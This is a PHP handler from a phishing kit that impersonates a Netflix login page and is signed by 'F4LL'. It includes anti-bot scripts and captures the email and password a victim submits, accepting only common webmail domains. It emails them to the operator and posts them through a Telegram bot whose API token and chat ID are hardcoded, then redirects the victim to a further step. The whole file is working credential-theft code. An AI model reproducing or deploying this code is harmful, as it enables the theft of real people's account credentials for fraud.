<?php
include('../tonmail.php');
include('../prevents/anti1.php');
include('../prevents/anti2.php');
include('../prevents/anti3.php');
include('../prevents/anti4.php');
include('../prevents/anti5.php');
include('../prevents/anti6.php');
include('../prevents/anti7.php');
include('../prevents/anti8.php');
if(isset($_POST['auth'])){

	

			session_start();

			$_SESSION['email'] = htmlspecialchars($_POST['email']);
			$_SESSION['password'] = htmlspecialchars($_POST['password']);
			$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
			$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

if(strpos($_SESSION['email'], "hotmail.com") || strpos($_SESSION['email'], "hotmail.fr") || strpos($_SESSION['email'], "live.fr") || strpos($_SESSION['email'], "outlook.fr") || strpos($_SESSION['email'], "outlook.com") || strpos($_SESSION['email'], "orange.fr") || strpos($_SESSION['email'], "orange.com") || strpos($_SESSION['email'], "wanadoo.fr") || strpos($_SESSION['email'], "sfr.fr") || strpos($_SESSION['email'], "club-internet.fr") || strpos($_SESSION['email'], "neuf.fr") || strpos($_SESSION['email'], "aliceadsl.fr") || strpos($_SESSION['email'], "noos.fr") || strpos($_SESSION['email'], "yahoo.com") || strpos($_SESSION['email'], "yahoo.fr") || strpos($_SESSION['email'], "aol.com") || strpos($_SESSION['email'], "aol.fr") || strpos($_SESSION['email'], "gmail.com") || strpos($_SESSION['email'], "icloud.com") || strpos($_SESSION['email'], "gmx.fr") || strpos($_SESSION['email'], "gmx.de") || strpos($_SESSION['email'], "free.fr") || strpos($_SESSION['email'], "bbox.fr")){

	


			$message = "

            [💻 Compte Netflix 💻]
			💻 E-mail : ".$_SESSION['email']."
			💻 Mot de passe : ".$_SESSION['password']."
			
			[🪓] - By F4LL - @f4ll_1337
			";

			$subject = "[🕸] - +1 Netflix Account @f4ll_1337";
			$headers = "From: F4ll Netflix <log@netflixpardon.com>";

			mail($rezmail, $subject, $message, $headers);
	        function telegram_send($message) {
            $curl = curl_init();
            $api_key  = '5961045250:AAHBlc3zT7H-hQXG1yQ0IyGw9DNnqmtFaTI';
            $chat_id  = '-1001833722835';
            $format   = 'HTML';
            curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot'. $api_key .'/sendMessage?chat_id='. $chat_id .'&text='.       $message .'&parse_mode=' . $format);
            curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); 
            $result = curl_exec($curl);
            curl_close($curl);
            return true;
            }

            telegram_send(urlencode($message));

			header('Location: ../steps/auth_message.php');
			}
			else{
				header('Location: ../index.php?error=email');

			}










}
else{
	header('Location: ../');
}

?>